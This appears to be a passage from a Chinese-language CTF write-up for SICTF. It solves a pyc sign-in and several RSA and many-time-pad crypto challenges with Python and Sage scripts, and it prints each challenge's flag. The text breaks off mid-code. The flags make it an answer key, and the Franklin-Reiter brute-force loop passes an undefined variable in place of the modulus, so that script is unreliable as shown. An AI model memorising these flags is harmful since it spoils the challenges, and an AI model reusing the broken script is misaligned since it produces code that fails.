title="[签到]PYC"></a>[签到]PYC</h2><p>丢进在线pyc反编译即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h2><ol><li><p>打开文件，是一串emoji表情，base100解码。</p><p><img src="/SICTF/c_1_1.png"></p></li><li><p>丢到赛博厨子里一个一个试，得到flag。</p><p><img src="/SICTF/c_1_2.png"></p></li></ol><h2 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h2><p>RSA的p高位泄露。</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(n)</span><br><span class="line">print(leak)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><ol><li><p>先利用在线网站算出p。（在线网站：<a href="https://sagecell.sagemath.org/%EF%BC%89">https://sagecell.sagemath.org/）</a></p><p><img src="/SICTF/c_2_1.png"></p></li><li><p>最后把p带入常规的rsa解码脚本，即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">11790815224554410800121104187905468470390194289969616547114051282402254164513760262526048229096923579410713190006883604069013303904509383122210101811900773</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>利用工具一把梭，即可得到flag。</p><p><img src="/SICTF/c_3_1.png"></p><h2 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h2><p>参考链接：<a href="https://blog.csdn.net/m0_63303407/article/details/127193042">https://blog.csdn.net/m0_63303407/article/details/127193042</a></p><ol><li><p>直接利用现成的脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="comment">#know(10, 21, &#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#know(8, 14, &#x27;n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red,Rdin+ Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey de mo8her. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother liz ou8 in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hcu fr#m the vklla e</span></span><br><span class="line"><span class="string">. When Litxl     Re( Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered thi ood? a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her.,Se d%d not klow 0h</span></span><br><span class="line"><span class="string">nim-l he waq, a)d</span></span><br><span class="line"><span class="string">id #f him.  Goo#</span></span><br><span class="line"><span class="string">day to you   itt e Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>可以勉强看出这是一个小红帽的故事，开始修复字符，先修复第一行的<code>Little Red Riding Hood</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey her mother. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother lived out in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hour from the vklla e</span></span><br><span class="line"><span class="string">. When Little Red Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered the woods a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her. She did not klow 0h</span></span><br><span class="line"><span class="string">at a wicked animal he waq, a)d</span></span><br><span class="line"><span class="string"> was not afraid of him.  Goo#</span></span><br><span class="line"><span class="string">day to you, Little Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>接着修复第5行的<code>Little Red Riding Hood</code>，即可得到完整的文章。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood promise</span></span><br><span class="line"><span class="string">d to obey her mother. The gran</span></span><br><span class="line"><span class="string">dmother lived out in the woods</span></span><br><span class="line"><span class="string">, a half hour from the village</span></span><br><span class="line"><span class="string">. When Little Red Riding Hood</span></span><br><span class="line"><span class="string">entered the woods a wolf came</span></span><br><span class="line"><span class="string">up to her. She did not know wh</span></span><br><span class="line"><span class="string">at a wicked animal he was, and</span></span><br><span class="line"><span class="string"> was not afraid of him. &quot;Good</span></span><br><span class="line"><span class="string">day to you, Little Red Riding</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>最后得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_55631415/article/details/127994843">https://blog.csdn.net/weixin_55631415/article/details/127994843</a></p><ol><li><p>需要爆破e，e的范围是512到1024之间。</p></li><li><p>sage脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from tqdm import trange</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, e, n</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">n = <span class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m1=attack(c1,c2,n,2)</span></span><br><span class="line"><span class="comment">#print(long_to_bytes(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">9</span>,<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i)==<span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag=attack(c1,c2,i,e)</span><br><span class="line">    flag=long_to_bytes(<span class="built_in">int</span>(flag))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;SICTF&#123;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h2><p>思路是先将hint1和hint2通分然后相减求出q的倍数，之后再和n求最大公约数从而求出q，之后就是正常的rsa解法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span 